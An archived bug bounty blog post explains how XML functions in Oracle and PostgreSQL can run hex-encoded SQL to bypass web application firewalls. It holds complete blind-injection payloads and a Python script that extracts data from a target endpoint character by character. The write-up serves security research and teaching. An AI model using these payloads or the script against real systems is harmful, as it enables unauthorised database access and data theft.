---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-13_sql-injection-utilizing-xml-functions-in-oracle-and-postgresql-to-bypass-wafs.md
original_filename: 2023-02-13_sql-injection-utilizing-xml-functions-in-oracle-and-postgresql-to-bypass-wafs.md
title: 'SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass
  WAFs'
category: blogs
detected_topics:
- sqli
- command-injection
- api-security
- supply-chain
tags:
- imported
- blogs
- sqli
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 6892216f698d5bb12dad0e129b62c3f4a19857c323e055a349adae555f74692e
text_sha256: 27bf502fa90cab9e3bde8df0a42c456285775c7bc26acfb81a93dddb008cec1c
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-13_sql-injection-utilizing-xml-functions-in-oracle-and-postgresql-to-bypass-wafs.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `6892216f698d5bb12dad0e129b62c3f4a19857c323e055a349adae555f74692e`
- Text SHA256: `27bf502fa90cab9e3bde8df0a42c456285775c7bc26acfb81a93dddb008cec1c`


## Content

---
title: "SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs"
url: "https://mahmoudsec.blogspot.com/2023/02/sql-injection-utilizing-xml-functions.html"
final_url: "https://mahmoudsec.blogspot.com/2023/02/sql-injection-utilizing-xml-functions.html"
authors: ["Mahmoud Gamal (@Zombiehelp54)"]
bugs: ["SQL injection", "WAF bypass"]
publication_date: "2023-02-13"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1533
---

###  SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ February 13, 2023  ](https://mahmoudsec.blogspot.com/2023/02/sql-injection-utilizing-xml-functions.html "permanent link")

### TL;DR.

In this blog post we will be discussing how built-in XML functions in Oracle and PostgreSQL database management systems can be used to bypass web application firewalls (WAFs). I will be presenting two real-life examples from private bug bounty programs where traditional methods for bypassing WAFs were not effective.

### Introduction

It's really frustrating when you find a valid SQL injection vulnerability, but there isn't much to do because of a WAF blocking most of your payloads. Many WAF rules can be bypassed using character case switching, comments, splitting the payload into multiple parameters, double URL encoding and many other methods that depend on how the target application and the WAF handle your requests. 

However, In the cases we are discussing in this blog, I was not able to bypass the WAF using common WAF bypass methods. 

### Case 1: SQL Injection in an Oracle database - WAF bypass using REGEXP_LIKE() and DBMS_XMLGEN.GETXMLTYPE()

_*This is a private bug bounty program, so I won't be mentioning who the vendor is*_

  

While doing some static analysis reading JavaScript files, I found an endpoint https://target/administration-service/api/v1/image/{id},luckily it was accessible without authentication. When setting the {id} parameter to 1, the endpoint returned a 200 response with a blank page, and when setting it to 1 or 1=1 I was blocked by the WAF, however, when setting it to 1 or 1 like 1 it returned results which confirms that the endpoint is vulnerable to SQL injection through the id parameter.

  

To extract data from the database (to prove impact) I tried to use normal injection queries, but most of my requests were blocked by the WAF. I tried many methods to bypass it, but it was very strict that it blocked anything that had the keywords select, from and dual coming in this order no matter what's in between. At that point, I was stuck, so I decided to read the documentation of Oracle DBMS and have a look at the built-in functions that might be useful.

  

I was looking for a function that takes a string parameter as the query and executes it as this will allow us to split the query using string concatenation or encode it to formats that the WAF can't detect such as hex format and then we could use available decoding functions to convert it back to ASCII characters. Luckily, I found many XML functions that do exactly what I needed at <https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS73479>. For instance, we could use the GETXMLTYPE function:
  
  
  DBMS_XMLGEN.GETXMLTYPE ( 
  ctx  IN ctxhandle,
  dtdOrSchema  IN number := NONE)
  RETURN sys.XMLType;
  

This function takes a SQL query as a string, executes it and returns XML representation of the results. Now the next step is to find a function that takes a hex string and decodes it to ASCII characters. Back to the docs, the function we are looking for is cast_to_varchar2() within the utl_raw package (<https://docs.oracle.com/database/121/ARPLS/u_raw.htm#ARPLS71386>) 
  
  
  UTL_RAW.CAST_TO_VARCHAR2 (
  r IN RAW) 
  RETURN VARCHAR2; 

However, this function accepts data of type RAW, so we need a function that converts our hex string to raw bytes which is HEXTORAW():(<https://docs.oracle.com/cd/E18283_01/server.112/e17118/functions073.htm>) : 

`HEXTORAW` converts `char` containing hexadecimal digits in the `CHAR`, `VARCHAR2`, `NCHAR`, or `NVARCHAR2` data type to a raw value.

Let's chain all of this together, our payload now looks like this:
  
  
  DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('HEX_QUERY')))

The HEX_QUERY is the value of whichever query we want to execute converted to hex, for example the query "select user from dual" will be "73656C65637420757365722066726F6D206475616C" which allows us to fully evade the WAF detection rules. 

This payload alone is not enough because in this scenario we are not getting the results of the evaluated query in the response and we need to extract data based on a boolean value, hence we could use the REGEXP_LIKE() function (<https://docs.oracle.com/cd/B12037_01/server.101/b10759/conditions018.htm>):
  
  
  REGEXP_LIKE(source_string, pattern
  [, match_parameter ]
  )

REGEXP_LIKE is similar to the a LIKE condition, except REGEXP_LIKE performs regular expression matching instead of the simple pattern matching performed by LIKE and returns a boolean (True or Fasle). 

That being said, now we don't even have to use a matching operator which is usually detected by most WAF rules and we can pass our XML function as the source string, then match it on our test character using a regular expression. 

The full payload looks should look like this: 
  
  
  1 or REGEXP_LIKE(
      DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(
          HEXTORAW('{HEX_QUERY}')
          )
      ),'{REGEX}','i')

  

Here is an explanation of what each part of this payload does: 

\- '{HEX_QUERY' \--> Hexadecimal representation of the query we need to execute. 

\- HEXTORAW('{HEX_QUERY') \--> Converts our hexadecimal query to raw data type.

\- utl_raw.cast_to_varchar2() \--> Converts the raw data to varchar2 data type.

\- DBMS_XMLGEN.GETXMLTYPE() \--> Executes the query and returns the results as XML 

\- REGEXP_LIKE() \--> Match the XML results on the regular expression provided.

\- '{REGEX}' \--> The regular expression to match for.

\- 'i' \--> Case-insensitive matching flag, you can replace this with 'c' for case-sensitive matching

  

Here is an example query that checks if the current DBMS user starts with "a"
  
  
  1 or REGEXP_LIKE(
      DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(
          HEXTORAW('73656C65637420636F6E63617428757365722C274027292066726F6D206475616C')
          )
      ),'>a(.+)?@RES<','i')

In this example, the query executed is select concat(user,'@RES') from dual and the regex we match for is >a(.+)?@RES< because the result of our query is returned between XML tags, and we concatenate the results with '@RES' to match until that substring (so that we don't include the closing tag), it probably can be done better with a proper regular expression, but this works too :) 

  

Finally, I have written a simple python script that automates data extraction: 
  
  
  import requests
  import time
  
  requests.packages.urllib3.disable_warnings()
  
  s = "abcdefghijklmnopqrstuvwxyz0123456789_@." # charlist
  res = ''
  restart = True
  query = input("Query: ") # example: select concat(user,'RES') from dual
  query = query.encode("utf-8").hex() # Hex encode the query
  while(restart):
  restart = False
  for i in s:
      print(i)
  payload = f"1%20or%20REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('{query}'))),'>{str(res)}{str(i)}(.%2b)%3fRES<','i')"
  r= requests.get("https://{target}/administration-service/api/v1/image/{payload}", verify=False)
  if "data:" in r.text:
  res += str(i)
  print("Found:", res)
  restart = True
  break
  
  print("Output:" , res) 

And now we can execute any query without fearing the WAF.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgEuqpIa9Fr3iz9yU8jmhJUK7kvIOJZvLLziypWdtJDqb_pvePxgyk90Rcvg0TYMfLPHMM6rQROsf0-7iKjBI7utx40tt4llX4x4EL75XID7yue5cL1FSXdHDJQVX_rfWk0Xcq4LKAk3hiGfk0VoehYAWzE7kCTZDPOu0uFDokiyPcKk9KGRPEodB7F5A=w400-h359)](https://blogger.googleusercontent.com/img/a/AVvXsEgEuqpIa9Fr3iz9yU8jmhJUK7kvIOJZvLLziypWdtJDqb_pvePxgyk90Rcvg0TYMfLPHMM6rQROsf0-7iKjBI7utx40tt4llX4x4EL75XID7yue5cL1FSXdHDJQVX_rfWk0Xcq4LKAk3hiGfk0VoehYAWzE7kCTZDPOu0uFDokiyPcKk9KGRPEodB7F5A)

  
P.S: If you can't use REGEXP_LIKE, you can still get a boolean result using Oracle's XPATH functions (<https://docs.oracle.com/cd/E68885_01/doc.731/e68892/dev_xpath_functions.htm>)

### Case 2: SQL Injection in a PostgreSQL database - WAF bypass using query_to_xml() and xpath_exists()

In this case it's another annoying WAF but this time the backend DBMS is PostgreSQL. Similar to the previous case, I decided to search the docs for XML functions that take a query as a string and execute it. The function query_to_xml does this (<https://www.postgresql.org/docs/9.4/functions-xml.html>):
  
  
  query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)

This function takes a query of type text, executes it and returns the results in XML format. Similar to the previous example, we can use decode('{hex_query}','hex') to convert our hexadecimal query to bytes and convert_from() to convert it to text.

  

And for boolean-based results, we could use xpath_exists() (<https://www.postgresql.org/docs/9.3/functions-xml.html>)

  

Luckily for this target, error reporting was turned on and I could extract data using an error based query as the hexadecimal query passed to the query_to_xml() function. Here is an example payload:
  
  
  (select(1)where(
      xpath_exists('/',(
          query_to_xml(
              convert_from(
                  decode('73656c65637420636173742876657273696f6e2829206173206e756d6572696329','hex')
                      , 'UTF8'),true,true,''
                  )
               )
          )
      )
  )

Here is what the query above does: 

  * 73656c65637420636173742876657273696f6e2829206173206e756d6572696329 \-->Hexadecimal representation of select cast(version() as numeric).
  * decode() \--> Casts hexadecimal query to bytes.
  * convert_from()\--> Casts query bytes to ASCII text.
  * query_to_xml()\--> Executes the query.
  * xpath_exists()\--> Looks for the root element in the returned XML, it will return true if the query returns results and will throw a runtime error if it doesn't (You can use this for boolean-based exploitation). 

[![](https://blogger.googleusercontent.com/img/a/AVvXsEglapEH3gvXFBoYICWC1g2KjiVFs62dlu-lzUFHy9TLQjLGnJ6rUSBQ73avjpX5zb0a2GE1Kczl8ozE5nZjRAXaMAZcJ3fKwS_cXt_R3hO6hdMv3Xi8QOAakoQdKerrAyche-HUlrvVKr5qF737bbmKXNVdGmnwl09748g45mYT4Zb33lLsCCDZFwzpLg=w640-h100)](https://blogger.googleusercontent.com/img/a/AVvXsEglapEH3gvXFBoYICWC1g2KjiVFs62dlu-lzUFHy9TLQjLGnJ6rUSBQ73avjpX5zb0a2GE1Kczl8ozE5nZjRAXaMAZcJ3fKwS_cXt_R3hO6hdMv3Xi8QOAakoQdKerrAyche-HUlrvVKr5qF737bbmKXNVdGmnwl09748g45mYT4Zb33lLsCCDZFwzpLg)

### Conclusion: 

  * It's really important to read the documentation and understand how a DBMS works when exploiting SQL Injection. 
  * Not all cases are the same, you will always need to customize something yourself. 
  * Rather than spending hours searching for a bypass, read the docs and try to find built-in functions or statements that can help evade WAF detection rules.

  

Thanks for reading and feel free to drop me a tweet [@Zombiehelp54](https://twitter.com/@Zombiehelp54) if you have any questions.

[SQL Injection](https://mahmoudsec.blogspot.com/search/label/SQL%20Injection) [WAF](https://mahmoudsec.blogspot.com/search/label/WAF) [WAF ByPass](https://mahmoudsec.blogspot.com/search/label/WAF%20ByPass)

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Mohamed Serwah](https://www.blogger.com/profile/07030888294774271137)[February 22, 2023 at 6:32 AM](https://mahmoudsec.blogspot.com/2023/02/sql-injection-utilizing-xml-functions.html?showComment=1677076375257#c2821638819458927402)

Nice Catch 😘

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/2821638819458927402)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/277132840497237240?po=2297344590497480940&hl=en&saa=85391&origin=https://mahmoudsec.blogspot.com&skin=contempo)
